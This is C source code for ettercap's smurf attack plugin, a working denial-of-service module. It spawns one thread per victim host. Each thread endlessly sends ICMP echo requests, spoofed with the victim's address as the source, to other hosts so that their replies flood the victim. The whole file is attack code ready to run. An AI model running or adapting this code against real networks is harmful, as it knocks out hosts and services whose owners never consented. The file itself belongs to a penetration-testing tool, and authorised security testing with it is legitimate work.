/*
 *    the smurf attack plugin for ettercap
 *
 *    XXX - attack against IPv4 hosts is broken by some kernel bug
 *    on some systems as the kernel amends the source ip address
 */

#include <ec.h>
#include <ec_inet.h>
#include <ec_plugins.h>
#include <ec_send.h>
#include <ec_threads.h>

/* protos */
int plugin_load(void *);
static int smurf_attack_init(void *);
static int smurf_attack_fini(void *);
static EC_THREAD_FUNC(smurfer);

/* globals */

struct plugin_ops smurf_attack_ops = {
   .ettercap_version =     EC_VERSION,
   .name =                 "smurf_attack",
   .info =                 "Run a smurf attack against specified hosts",
   .version =              "1.0",
   .init =                 &smurf_attack_init,
   .fini =                 &smurf_attack_fini,
};

/* teh c0d3 */

int plugin_load(void *handle)
{
   return plugin_register(handle, &smurf_attack_ops);
}

static int smurf_attack_init(void *dummy)
{
   struct ip_list *i;

   DEBUG_MSG("smurf_attack_init");

   if(GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("smurf_attack: plugin doesnt work in unoffensive mode\n");
      return PLUGIN_FINISHED;
   }

   if(GBL_TARGET1->all_ip && GBL_TARGET1->all_ip6) {
      USER_MSG("Add at least one host to target one list.\n");
      return PLUGIN_FINISHED;
   }

   if(GBL_TARGET2->all_ip && GBL_TARGET2->all_ip6 && LIST_EMPTY(&GBL_HOSTLIST)) {
      USER_MSG("Target two and global hostlist are empty.\n");
      return PLUGIN_FINISHED;
   }

   GBL_OPTIONS->quiet = 1;
   INSTANT_USER_MSG("smurf_attack: starting smurf attack against the target one hosts\n");

   /* creating a thread per target */
   LIST_FOREACH(i, &GBL_TARGET1->ips, next) {
      ec_thread_new("smurfer", "thread performing a smurf attack", &smurfer, &i->ip);
   }

   /* same for IPv6 targets */
   LIST_FOREACH(i, &GBL_TARGET1->ip6, next) {
      ec_thread_new("smurfer", "thread performing a smurf attack", &smurfer, &i->ip);
   }

   return PLUGIN_RUNNING;
}

static int smurf_attack_fini(void *dummy)
{
   pthread_t pid;

   DEBUG_MSG("smurf_attack_fini");

   while(!pthread_equal(EC_PTHREAD_NULL, pid = ec_thread_getpid("smurfer"))) {
      ec_thread_destroy(pid);
   }

   return PLUGIN_FINISHED;
}

static EC_THREAD_FUNC(smurfer)
{
   struct ip_addr *ip;
   struct ip_list *i, *itmp;
   struct hosts_list *h, *htmp;
   LIST_HEAD(, ip_list) *ips;
   u_int16 proto;
   int (*icmp_send)(struct ip_addr*, struct ip_addr*);

   DEBUG_MSG("smurfer");

   ec_thread_init();
   ip = EC_THREAD_PARAM;
   proto = ntohs(ip->addr_type);

   /* some pointer magic here. nothing difficult */
   switch(proto) {
      case AF_INET:
         icmp_send = send_L3_icmp_echo;
         ips = &GBL_TARGET2->ips;
         break;
#ifdef WITH_IPV6
      case AF_INET6:
         icmp_send = send_icmp6_echo;
         ips = &GBL_TARGET2->ip6;
         break;
#endif
      default:
      /* This won't ever be reached
       * if no other network layer protocol
       * is added.
       */
         ec_thread_destroy(EC_PTHREAD_SELF);
         break;
   }

   LOOP {
      CANCELLATION_POINT();

      /* if target two list is not empty using it */
      if(!LIST_EMPTY(ips))
         LIST_FOREACH_SAFE(i, ips, next, itmp)
            icmp_send(ip, &i->ip);
      /* else using global hostlist */
      else
         LIST_FOREACH_SAFE(h, &GBL_HOSTLIST, next, htmp)
            if(ntohs(h->ip.addr_type) == proto)
               icmp_send(ip, &h->ip);

      usleep(1000*1000/GBL_CONF->sampling_rate);
   }

   return NULL;
}

